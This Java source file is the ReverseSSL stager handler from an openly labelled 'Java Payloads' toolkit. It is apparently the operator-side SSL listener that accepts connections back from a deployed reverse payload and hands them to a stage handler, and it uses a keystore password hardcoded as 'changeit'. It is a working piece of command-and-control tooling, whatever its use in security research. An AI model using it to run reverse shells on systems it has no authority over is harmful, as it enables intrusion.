/*
 * Java Payloads.
 * 
 * Copyright (c) 2010, Michael 'mihi' Schierl
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * - Redistributions of source code must retain the above copyright notice,
 *   this list of conditions and the following disclaimer.
 *   
 * - Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 *   
 * - Neither name of the copyright holders nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *   
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND THE CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * HOLDERS OR THE CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
 * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
 * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

package javapayload.handler.stager;

import java.io.PrintStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.security.KeyStore;
import java.security.SecureRandom;

import javapayload.handler.stage.StageHandler;

import javax.net.ssl.KeyManagerFactory;
import javax.net.ssl.SSLContext;
import javax.net.ssl.TrustManager;

public class ReverseSSL extends ListeningStagerHandler {

	private ServerSocket sslServerSocket = null;
	
	protected void startListen(String[] parameters) throws Exception {
		final SSLContext context = SSLContext.getInstance("SSL");
		final KeyStore ks = KeyStore.getInstance("JKS");
		ks.load(ReverseSSL.class.getResourceAsStream("keystore.jks"), "changeit".toCharArray());
		final KeyManagerFactory kmf = KeyManagerFactory.getInstance("SunX509");
		kmf.init(ks, "changeit".toCharArray());
		context.init(kmf.getKeyManagers(), new TrustManager[0], new SecureRandom());
		sslServerSocket = context.getServerSocketFactory().createServerSocket(Integer.parseInt(parameters[2]));
	}
	
	protected Object acceptSocket() throws Exception {
		return sslServerSocket.accept();
	}
	
	protected void stopListen() throws Exception {
		sslServerSocket.close();
		sslServerSocket = null;
	}
	
	protected void handleSocket(Object socket, StageHandler stageHandler, String[] parameters, PrintStream errorStream) throws Exception {
		Socket s = (Socket) socket;
		stageHandler.handle(s.getOutputStream(), s.getInputStream(), parameters);
	}
}
